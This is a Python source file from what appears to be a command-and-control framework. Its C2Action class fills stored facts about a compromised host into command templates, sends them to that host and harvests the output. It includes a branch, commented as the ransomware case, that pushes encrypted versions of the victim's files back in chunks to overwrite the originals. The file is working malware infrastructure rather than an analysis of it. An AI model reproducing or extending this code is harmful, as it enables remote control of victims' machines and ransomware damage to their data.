import time
from string import Formatter
from typing import List, Union
from c2.c2_server import ConnectionStorage, send_c2_command
from c2.c2_facts import FactsStorage, NotExistentFact
import os


class ActionRequirementsNotSatisfied(Exception):
    pass


class C2Action:
    def __init__(self, commandsList: List[Union[str, bytes]], parserStub: callable,
                 requiredFacts: List[str], name: str = "", description: str = "",
                 outputFacts: List[str] = None):
        self.factsStorage = None
        self.commandsList = commandsList
        """
        The parserStub must implement the logic to parse commands' outputs,
        to scrape facts from them. It takes as input conn_uuid, and a list of commands' indexes
        so that it can call 'read_c2_log' function multiple times. It must return a list
        of pairs, each one of the form (fact_name, fact_value).
        """
        self.parser = parserStub
        self.requiredFacts = requiredFacts
        self.name = name
        self.description = description
        self.outputFacts = outputFacts or []
        self.iterative = False
        self.enrich_facts = False
        self.migrate_facts = {}
        self.commands_latency = 0
        self.successful = None

    def performAction(self, connUuid: str):
        connectionStorage = ConnectionStorage()
        self.factsStorage = FactsStorage(connectionStorage, connUuid)
        factsSubset = {}
        for fact_name in self.requiredFacts:
            try:
                factsSubset[fact_name] = self.factsStorage.getFact(fact_name)
            except NotExistentFact:
                raise ActionRequirementsNotSatisfied
        if self.iterative:
            for fact_name in factsSubset:
                if not isinstance(factsSubset[fact_name], list):
                    continue
                else:
                    fmt = CmdFormatter()
                    newCommandList = []
                    curlyFactName = '{' + fact_name + '}'
                    for cmd in self.commandsList:
                        if not isinstance(cmd, str):
                            newCommandList.append(cmd)
                        elif curlyFactName not in cmd:
                            newCommandList.append(cmd)
                        else:
                            for fact_item in factsSubset[fact_name]:
                                fmtSubset = {fact_name: fact_item}
                                new_cmd = fmt.format(cmd, **fmtSubset)
                                newCommandList.append(new_cmd)
                                # "decoration" for write file protocol; should be implemented in an inherited class
                                try:
                                    # it is the case in which a list of files is read and then needs to be overwritten
                                    # with its encrypted version; or rather, it's the case of the ransomware
                                    if new_cmd.startswith('write') and '_files' in fact_name:
                                        relative_path = new_cmd.split()[1].replace('\\', '_') + '.enc'
                                        with open(
                                            os.path.join('/usr/src/app/c2/connections/', connUuid, relative_path),
                                            'rb'
                                        ) as enc_file:
                                            enc_data = enc_file.read()
                                        chunk_size = 1460
                                        enc_data = [enc_data[i:i + chunk_size]
                                                    for i in range(0, len(enc_data), chunk_size)]
                                        for chunk in enc_data:
                                            newCommandList.append(chunk)
                                except TypeError:
                                    pass
                    self.commandsList = newCommandList
        fmt = CmdFormatter()
        cmd_uuid_list = []
        for cmd in self.commandsList:
            try:
                cmd = fmt.format(cmd, **factsSubset)
            except TypeError:
                pass
            cmd_uuid = send_c2_command(self.factsStorage.connUuid, cmd)
            cmd_uuid_list.append(cmd_uuid)
            if self.commands_latency > 0:
                time.sleep(self.commands_latency)
        cmd_indexes_list = []
        for cmd_uuid in cmd_uuid_list:
            while cmd_uuid not in self.factsStorage.getConn()['cmd_uuid_to_index']:
                time.sleep(1)
                self.factsStorage.connectionStorage.reload()
            cmd_indexes_list.append(
                self.factsStorage.getConn()['cmd_uuid_to_index'][cmd_uuid]['index']
            )
            while self.factsStorage.getConn()['cmd_uuid_to_index'][cmd_uuid]['pending']:
                time.sleep(1)
                self.factsStorage.connectionStorage.reload()
                if not self.factsStorage.getConn()['is_alive']:
                    self.successful = False
                    break
        facts = self.parser(self.factsStorage.connUuid, cmd_indexes_list)
        for fact_name, fact_value in facts:
            if fact_name in self.migrate_facts:
                fact_name = self.migrate_facts[fact_name]
            if self.enrich_facts:
                self.factsStorage.enrichFact(fact_name, fact_value)
            else:
                self.factsStorage.setFact(fact_name, fact_value)
        if self.successful is None:
            self.successful = True
        return cmd_indexes_list

    def describeAction(self):
        message = f"{self.name}: {self.description}\n"
        message += f"Required facts: {', '.join(self.requiredFacts)}\n"
        message += f"Output facts: {', '.join(self.outputFacts)}\n"
        commands_to_show = [cmd if isinstance(cmd, str) else 'data' for cmd in self.commandsList]
        message += f"List of commands:\n"
        for cmd in commands_to_show:
            message += cmd + '\n'
        return message

    def iterativeAction(self):
        self.iterative = True

    def enrichingKnowledgeAction(self):
        self.enrich_facts = True

    def migrateFacts(self, source_fact: str, target_fact: str):
        self.migrate_facts[source_fact] = target_fact

    def additionalLatency(self, latency: int):
        self.commands_latency = latency

    def isSuccessful(self) -> bool:
        if self.successful is None:
            return False
        else:
            return self.successful


class CmdFormatter(Formatter):
    def get_value(self, key, args, kwargs):
        if isinstance(key, str):
            try:
                return kwargs[key]
            except KeyError:
                # there can be arbitrary data with curly brackets
                return "{" + key + "}"
        else:
            return Formatter.get_value(self, key, args, kwargs)
